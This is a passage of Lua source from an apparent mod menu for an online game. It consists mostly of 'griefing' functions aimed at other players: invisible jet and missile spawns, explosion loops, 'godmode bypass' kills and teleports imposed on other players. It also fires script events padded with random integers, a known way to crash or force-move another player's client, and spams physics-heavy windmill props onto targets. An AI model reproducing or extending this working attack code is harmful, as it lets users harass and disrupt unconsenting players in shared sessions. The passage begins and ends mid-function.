        local pid = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        local spawn = VEHICLE.CREATE_VEHICLE(lazer, pid.x, pid.y, pid.z+150, 0, true, false, false)
        local pedspawn = PED.CREATE_PED(26, ped, pid.x, pid.y, pid.z+150, 0, true, false)

        ENTITY.SET_ENTITY_VISIBLE(spawn, false)
        PED.SET_PED_INTO_VEHICLE(pedspawn, spawn, -1)
        ENTITY.SET_ENTITY_VISIBLE(pedspawn, false)
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(spawn, -20)
        ENTITY.SET_ENTITY_ROTATION(spawn, -90.0, 0.0, 0.0, 1, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(spawn, 100)

        local id = get_closest_vehicle(entity)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local ufo_object = util.joaat("xs_prop_arena_airmissile_01a")
        STREAMING.REQUEST_MODEL(ufo_object)
        while not STREAMING.HAS_MODEL_LOADED(ufo_object) do
            util.yield()
        end

        local object1 = entities.create_object(ufo_object, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))

        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true);
        
        ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, spawn, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object1, spawn)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(spawn, object1, 0, 1, 10, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, spawn, 0, 1, 10, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(object1, true)
        util.yield(3000)
        entities.delete_by_handle(spawn)
        entities.delete_by_handle(pedspawn)
        entities.delete_by_handle(ufo_object)
        entities.delete_by_handle(object1)
    end)

    menu.divider(Owned_Anon_Explode, "Fake Loop")

    menu.toggle_loop(Owned_Anon_Explode, "Fake Explosion Loop", {"fakeexplode"}, "Explosion dealing no damage", function() --fake exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 0.0, true, false, 1.0, false)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    killgods = menu.list(Owned_Anon, "Kill Godmode Shit", {}, "", function(); end)

	menu.action(killgods, "Kill Godmode Player V1", {"killgod"}, "", function()
		menu.trigger_commands("confuse" .. PLAYER.GET_PLAYER_NAME(pid))
		menu.trigger_commands("explodeloop" .. PLAYER.GET_PLAYER_NAME(pid))
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(killgods, "Kill Godmode Player V2", {"killgodv2"}, "Note: this will not work if they have no ragdoll on", function()
        local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3

        local khanjali = util.joaat("khanjali")
        STREAMING.REQUEST_MODEL(khanjali)
        while not STREAMING.HAS_MODEL_LOADED(khanjali) do
            util.yield()
        end

        local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(1200)
        entities.delete_by_handle(vehicle1)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.divider(killgods, "Owned & Anon")

    menu.action(killgods, "Owned Godmode Kill Explosion", {"ogexplode"}, "Automatically bypasses player's godmode and explode the player (only works on bad menus)", function() --owned godmode exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        menu.trigger_commands("confuse".. players.get_name(pid).. " on")
        util.yield(10)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(10)
        menu.trigger_commands("confuse".. players.get_name(pid).. " off")
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(killgods, "Anon Godmode Kill Explosion", {"agexplode"}, "Automatically bypasses player's godmode and explode the player (only works on bad menus)", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        menu.trigger_commands("confuse".. players.get_name(pid).. " on")
        util.yield(10)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(10)
        menu.trigger_commands("confuse".. players.get_name(pid).. " off")
    end, nil, nil, COMMANDPERM_AGGRESSIVE)


    menu.toggle_loop(griefing, "Push player up", {"pushup"}, "Works best if the player is walking on flat ground.", function()
        local vehicle = 4174679674 --1518533038
        STREAMING.REQUEST_MODEL(vehicle)
        while not STREAMING.HAS_MODEL_LOADED(vehicle) do
            wait(100)
        end
        local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        local spawn = VEHICLE.CREATE_VEHICLE(vehicle, coords.x, coords.y, coords.z-3, 0, true, false, false)
        ENTITY.SET_ENTITY_VISIBLE(spawn, false, false)
        ENTITY.SET_ENTITY_ROTATION(spawn, 90.0, 0.0, 0.0, 1, true)
        util.yield(100)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(spawn, 200)
        util.yield(2000)
        util.yield(2000)
        request_control_of_entity(spawn)
        DELETE(spawn)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicle)
    end)

    menu.action(griefing, "Make Player Explode All", {"makethemexplodeall"}, "", function()
		menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " explodeall")
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    tpoptions = menu.list(griefing, "TP Options", {}, "", function(); end)

    griefingtpp = menu.list(tpoptions, "TP Player", {}, "", function(); end)

    menu.action(griefingtpp, "Teleport To Them", {"goingtheere"}, "", function()
        menu.trigger_commands("tp" .. players.get_name(pid))
        end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.action(griefingtpp, "Teleport To Me", {"cometome"}, "", function()
        menu.trigger_commands("summon" .. players.get_name(pid))
        end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.action(griefingtpp, "TP Player To MazeBank", {"tpmazebank"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 1 do
            menu.trigger_commands("panic")
            util.trigger_script_event(1 << pid, {-1390976345, 20, 1, -1, 1, 112, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-1390976345, 20, 1, -1, 1, 112, 0, 0, 0})
            end
            menu.trigger_commands("givesh" .. players.get_name(pid))
            util.yield(100)
            for i = 1, 1 do
            menu.trigger_commands("panic")
            util.trigger_script_event(1 << pid, {-1390976345, 20, 1, -1, 1, 112, 0, 0, 0, pid, math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-1390976345, 20, 1, -1, 1, 112, 0, 0, 0})
            end
            util.yield(100)
            util.trigger_script_event(1 << pid, {-1390976345, 20, 1, -1, 1, 112, 0, 0, 0})
            end)

            menu.toggle_loop(tpoptions, "TP On Ped Loop", {"tploopon"}, "", function(on_toggle)
                if on_toggle then
                menu.trigger_commands("tp" .. players.get_name(pid))
                else
                menu.trigger_commands("tp" .. players.get_name(pid))
                end
                end)
                        
        griefingtp = menu.list(tpoptions, "TP All Players", {}, "", function(); end)

    menu.action(griefingtp, "TP Everyone To MazeBank", {"tpallmazebank"}, "Teleports all players to mazebank you.", function()
        excludeselected = true
        menu.trigger_commands("tpplayersmazebank")
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(griefingtp, "TP All Players to me", {"tpallplayers"}, "Teleports all players to you.", function()
        menu.trigger_commands("say " .. " Get on the bike :)")
        menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " manchez")
        util.toast("Give them a second to get on...")
        util.yield(10000)
        excludeselected = true
        menu.trigger_commands("tpplayers")
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(griefingtp, "TP All Players Near me", {"tpallnear"}, "Teleports all players near you.", function()
        menu.trigger_commands("aptmeall")
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    function attachto(offx, offy, offz, pid, angx, angy, angz, hash, isnpc, isveh)
        atomicattachto = util.create_thread(function(thr)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
            coords.x = coords['x']
            coords.y = coords['y']
            coords.z = coords['z']
            if isnpc then
                obj = entities.create_ped(1, hash, coords, 90.0)
            elseif isveh then
                obj = entities.create_vehicle(hash, coords, 90.0)
            else
                obj = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
            end
            ENTITY.SET_ENTITY_INVINCIBLE(obj, true)
            ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(obj, false, true)
                while true do
                    local player_coords = ENTITY.GET_ENTITY_COORDS(ped, false)
                    local obj_coords = ENTITY.GET_ENTITY_COORDS(obj, false)
                    local dist =  MISC.GET_DISTANCE_BETWEEN_COORDS(player_coords['x'], player_coords['y'], player_coords['z'], obj_coords['x'], obj_coords['y'], obj_coords['z'], false)
                    if dist > 0.1 then
                        local behind = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, offx, offy, offz)
                        ENTITY.SET_ENTITY_COORDS(obj, behind['x'], behind['y'], behind['z'], false, false, false, false)
                    end
                    if not stopato then
                    util.stop_thread()
                    if not ENTITY.DOES_ENTITY_EXIST(obj) then
                    end
                    attachto(offx, offy, offz, pid, angx, angy, angz, hash, isnpc, isveh)
                    end
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    if not players.exists(pid) then
                        util.toast(aatoast)
                        util.stop_thread()
                    else
                    end
                    util.yield()
                end
            end)
        end

        function request_control_of_entity(ent)
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
                util.toast("Requesting entity control of " .. ent)
                local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
                NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
                local st_time = os.time()
                while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) do
                    if os.time() - st_time >= 5 then
                        util.toast("Failed to request entity control in 5 seconds (entity " .. ent .. ")")
                        break
                    end
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
                    util.yield()
                end
            end
        end

        function is_ped_player(ped)
            if PED.GET_PED_TYPE(ped) >= 4 then
                return false
            else
                return true
            end
        end

    attachoptions = menu.list(griefing, "Attach Options", {}, "", function(); end)

    
    local windmilling = menu.list(attachoptions, "Spam Windmills", {}, "")

    menu.toggle_loop(windmilling, "Spam Windmills", {"togglemills"}, "", function(on_toggle)
 --       if pid ~= players.user() then
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza2 = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        for i = 0, 100 do 
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        util.yield(10)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza2)
        return
--        end
    end
    end)

    menu.toggle_loop(windmilling, "Windmills V2", {"togglemillsv1"}, "", function(on_toggle)
        if pid ~= players.user() then
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                util.yield(1000)
                entities.delete_by_handle(object)
            end
        end)

    menu.toggle_loop(windmilling, "Attach Windmills", {"attachmills"}, "", function()
        if pid ~= players.user() then
        local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local khanjali = util.joaat("prop_windmill_01")
        STREAMING.REQUEST_MODEL(khanjali)
        while not STREAMING.HAS_MODEL_LOADED(khanjali) do
            util.yield()
        end
        local vehicle1 = entities.create_object(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        local vehicle2 = entities.create_object(khanjali, playerpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        local vehicle3 = entities.create_object(khanjali, playerpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        local vehicle4 = entities.create_object(khanjali, playerpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
        util.yield(10)
        end
    end)

    menu.divider(windmilling, "__________________bruh__________________")

    menu.action(windmilling, "Clear Windmill's", {"clearwindmills"}, "", function()
        local count = 0
        for k,ent in pairs(entities.get_all_objects_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end
    end)


    menu.action(attachoptions, "Attach A Cone", {"aacone"}, "", function(on_click)
        attachto(0.0, 0.07, 0.63, pid, 0.0, 90.0, 0.0, 3760607069, false, false)
    end)

    menu.action(attachoptions, "Attach A Backpack", {"abackpack"}, "", function(on_click)
        attachto(0.0, -0.15, 0.0, pid, 0.0, 0.0, 0.0, 4208448709, false, false)
    end)


menu.action(attachoptions,"Attach A Umbrella", {}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local candyattach = util.joaat("p_amb_brolly_01")
    STREAMING.REQUEST_MODEL(candyattach)
    while not STREAMING.HAS_MODEL_LOADED(candyattach) do
        util.yield()
    end
    local cane1 = entities.create_object(candyattach, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cane1, id, playerpos, 0.2, 0.2, 0.5, 0, 0, 0, -180, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(cane1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(cane1)
    util.yield(100)
end)

    menu.action(attachoptions, "Attach Candy Cane", {"attachcandycane"}, "", function()
        local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local candyattach = util.joaat("w_me_candy_xm3")
        STREAMING.REQUEST_MODEL(candyattach)
        while not STREAMING.HAS_MODEL_LOADED(candyattach) do
            util.yield()
        end
        local cane1 = entities.create_object(candyattach, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(cane1, id, playerpos, 0, 0, 1, 0, 0, 0, -180, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(cane1, true, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(cane1)
        util.yield(100)
    end)

    menu.action(attachoptions, "Attach Dunce Hat", {"attachduncehat"}, "", function()
        local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local candyattach = util.joaat("prop_mk_cone")
        STREAMING.REQUEST_MODEL(candyattach)
        while not STREAMING.HAS_MODEL_LOADED(candyattach) do
            util.yield()
        end
        local cane1 = entities.create_object(candyattach, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(cane1, id, playerpos, 0, 0, 1.5, 0, 180, 0, -180, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(cane1, true, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(cane1)
        util.yield(100)
    end)
    
    menu.action(attachoptions, "Attach A Ramp", {"attachramp"}, "Works best on vehicles", function()
        local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local rampattach = util.joaat("lts_prop_lts_ramp_03")
        STREAMING.REQUEST_MODEL(rampattach)
        while not STREAMING.HAS_MODEL_LOADED(rampattach) do
            util.yield()
        end
        local vehicle1 = entities.create_object(rampattach, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        local vehicle2 = entities.create_object(rampattach, playerpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        local vehicle3 = entities.create_object(rampattach, playerpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        local vehicle4 = entities.create_object(rampattach, playerpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
        util.yield(100)
    end)

    menu.action(attachoptions, "Clear Objects", {"clearobjects"}, "", function()
        local count = 0
        for k,ent in pairs(entities.get_all_objects_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end
    end)

    menu.action(attachoptions, "Clear Vehicles", {"clearvehicles"}, "", function()
        local count = 0
        for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
            local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
            if not PED.IS_PED_A_PLAYER(PedInSeat) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                count = count + 1
                util.yield()
            end
        end
    end)

    menu.action(attachoptions, "Custom Object Model", {"customattmodel"}, "", function(on_click)
        util.toast("Please input the model name")
        menu.show_command_box("customattmodel" .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
    end, function(on_command)
        local hash = util.joaat(on_command)
        request_model_load(hash)
        attachto(0.0, 0.0, 0.0, pid, 90.0, 0.0, 0.0, hash, false)
    end)
    
    menu.action(attachoptions, "Custom Vehicle Model", {"customvemodel"}, "", function(on_click)
        util.toast("Please input the model name")
        menu.show_command_box("customvemodel" .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
    end, function(on_command)
        local hash = util.joaat(on_command)
        request_model_load(hash)
        attachto(0.0, 0.0, 0.0, pid, 0.0, 0.0, 0.0, hash, false, true)
    end)

    menu.toggle(attachoptions, "Attach To Player", {"attachto"}, "", function(on)
        if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) == players.user_ped() then 
            return
        end
        if on then
            ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
        else
            ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
            end
        end)
    
    menu.toggle_loop(attachoptions, "Attach All Nearby Entities", {"attachallnearby"}, "", function(on_toggle)
        local tar = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        objects = entities.get_all_objects_as_handles()
        vehicles = entities.get_all_vehicles_as_handles()
        peds = entities.get_all_peds_as_handles()
        for i, ent in pairs(peds) do
            if not is_ped_player(ped) then
